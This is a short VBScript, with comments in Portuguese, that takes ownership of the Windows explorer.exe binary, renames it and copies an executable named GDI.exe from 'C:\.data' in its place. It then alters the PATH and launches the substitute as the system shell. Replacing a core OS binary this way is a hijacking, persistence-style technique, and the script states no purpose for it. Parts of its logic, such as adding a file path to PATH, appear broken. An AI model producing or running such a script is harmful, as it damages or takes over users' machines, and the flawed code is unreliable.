Option Explicit

Dim strFilePath, objShell, strExplorerExe

' Localize o caminho do arquivo "GDI.exe"
strFilePath = "C:\.data\GDI.exe"

' Verifique se o arquivo "GDI.exe" existe
If Not FileExists(strFilePath) Then
    MsgBox "O arquivo " & strFilePath & " não foi encontrado." & vbCrLf & _
           "Tente novamente.", 16, "Erro"
    WScript.Quit
End If

' Defina a localização do executável "explorer.exe"
strExplorerExe = "%windir%\explorer.exe"

' Renomeie o arquivo "explorer.exe" para "explorer.exe.old"
CreateObject("WScript.Shell").Exec("cmd /c takeown /f " & strExplorerExe & " && icacls " & strExplorerExe & " /grant administrators:F")
CreateObject("WScript.Shell").Exec("cmd /c rename " & strExplorerExe & " explorer.exe.old")

' Copie o arquivo "GDI.exe" para o local do "explorer.exe"
CreateObject("WScript.Shell").Exec("cmd /c copy " & strFilePath & " " & strExplorerExe)

' Ative a "Substituição do Painel de Controle" no "explorer.exe" (caso seja necessário)
CreateObject("WScript.Shell").Exec("cmd /c echo %PATH% | find /i """ & strFilePath & """ || setx PATH """ & strFilePath & ";%PATH%""")

' Inicie o novo "explorer.exe" (que é a GDI.exe)
Set objShell = CreateObject("WScript.Shell")
objShell.Exec("explorer.exe")

' Função para verificar se um arquivo existe
Function FileExists(strFullPath)
    Dim objFSO
    Set objFSO = CreateObject("Scripting.FileSystemObject")
    If objFSO.FileExists(strFullPath) Then
        FileExists = True
    Else
        FileExists = False
    End If
End Function